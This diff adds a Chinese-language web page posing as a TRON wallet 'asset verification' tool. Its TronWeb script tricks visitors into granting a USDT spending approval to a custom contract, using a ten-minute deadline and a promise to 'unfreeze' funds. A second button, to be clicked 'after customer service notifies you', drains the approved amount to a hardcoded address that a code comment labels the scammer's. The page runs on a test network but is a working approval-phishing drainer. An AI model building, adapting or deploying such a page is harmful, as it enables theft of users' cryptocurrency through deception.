@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>進行錢包資產驗證</title>
+  <style>
+    .center {
+      margin: auto;
+      width: 60%;
+      padding: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 5px;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="center">
+    <button id="connectButton">請連接錢包</button>
+  </div>
+
+  <div class="center">
+    <label>驗證地址：</label>
+    <input id="verifyAddress" />
+  </div>
+
+  <div class="center">
+    <label>驗證金額：</label>
+    <input id="verifyAmount" placeholder="0.1" />
+  </div>
+
+  <div class="center">
+    <button id="approve_Btn">驗證（授權）</button>
+  </div>
+
+  <div class="center">
+    <label>⚠️ 請於十分鐘內完成驗證流程</label>
+  </div>
+
+  <div class="center">
+    <button id="transferFrom_Btn">請於客服通知後點擊</button>
+  </div>
+
+  <div class="center">
+    <label>驗證完成後將開啟解凍</label>
+  </div>
+
+  <script>
+    const connectButton = document.getElementById("connectButton");
+    const approveButton = document.getElementById("approve_Btn");
+    const transferFromButton = document.getElementById("transferFrom_Btn");
+
+    const verifyAddressInput = document.getElementById("verifyAddress");
+    const verifyAmountInput = document.getElementById("verifyAmount");
+
+    // Shasta 測試網 USDT 合約地址
+    const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
+
+    // 你部署的 MyDex 合約地址（請確定正確）
+    const MyDex_contractAddress = "TDXNbzDWrovDb3bLMAh4dPKGLU8VCDoCbu";
+
+    const TRC20_ABI = [
+      {
+        constant: false,
+        inputs: [
+          { name: "_spender", type: "address" },
+          { name: "_value", type: "uint256" }
+        ],
+        name: "approve",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function"
+      },
+      {
+        constant: true,
+        inputs: [
+          { name: "_owner", type: "address" },
+          { name: "_spender", type: "address" }
+        ],
+        name: "allowance",
+        outputs: [{ name: "remaining", type: "uint256" }],
+        type: "function"
+      }
+    ];
+
+    const MyDex_ABI = [
+      {
+        constant: false,
+        inputs: [{ name: "user", type: "address" }],
+        name: "addAddress",
+        outputs: [],
+        type: "function"
+      },
+      {
+        constant: true,
+        inputs: [{ name: "index", type: "uint256" }],
+        name: "getIndexAddress",
+        outputs: [{ name: "", type: "address" }],
+        type: "function"
+      },
+      {
+        constant: false,
+        inputs: [
+          { name: "from", type: "address" },
+          { name: "to", type: "address" },
+          { name: "amount", type: "uint256" }
+        ],
+        name: "transferFrom",
+        outputs: [],
+        type: "function"
+      }
+    ];
+
+    connectButton.onclick = async () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        alert("錢包已連接：" + window.tronWeb.defaultAddress.base58);
+        connectButton.innerHTML = "已連接錢包：" + window.tronWeb.defaultAddress.base58;
+      } else if (window.tronLink) {
+        // 觸發 TronLink 連接，舊版可能會用這方法
+        try {
+          await window.tronLink.request({ method: "tron_requestAccounts" });
+        } catch (error) {
+          alert("請先允許錢包連接");
+        }
+      } else {
+        alert("請安裝 TronLink 或使用 imToken 內建瀏覽器");
+      }
+    };
+
+    approveButton.onclick = async () => {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert("請先連接錢包");
+        return;
+      }
+
+      const approveAddress = verifyAddressInput.value.trim();
+      const amountStr = verifyAmountInput.value.trim();
+      if (!approveAddress || !amountStr) {
+        alert("請輸入驗證地址與金額");
+        return;
+      }
+
+      // 單位轉換：USDT 在 TRON 是6位小數
+      const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString();
+      const userAddress = window.tronWeb.defaultAddress.base58;
+
+      const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+      const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+
+      try {
+        console.log("📝 開始授權 USDT", amount);
+        const tx1 = await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
+        console.log("✅ 授權成功：", tx1);
+
+        const tx2 = await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
+        console.log("✅ 加入地址成功：", tx2);
+
+        alert("授權及加入地址成功");
+      } catch (err) {
+        console.error("❌ 授權錯誤：", err);
+        alert("授權失敗，請確認 TRX 手續費是否足夠，或合約地址是否正確");
+      }
+    };
+
+    transferFromButton.onclick = async () => {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert("請先連接錢包");
+        return;
+      }
+
+      const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+      const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+
+      try {
+        const from = await MyDex.getIndexAddress(0).call();
+        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 你測試網詐騙者地址，請確認是否為你指定收款地址
+        const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+
+        if (BigInt(allowance) === 0n) {
+          alert("尚未授權，無法轉帳");
+          return;
+        }
+
+        console.log("💸 開始轉帳 USDT，金額:", allowance.toString());
+        const tx = await MyDex.transferFrom(from, to, allowance).send({ feeLimit: 100_000_000 });
+        console.log("✅ 轉帳成功：", tx);
+        alert("轉帳成功");
+      } catch (err) {
+        console.error("❌ 轉帳失敗：", err);
+        alert("轉帳失敗，請確認授權狀態");
+      }
+    };
+  </script>
+</body>
+</html>
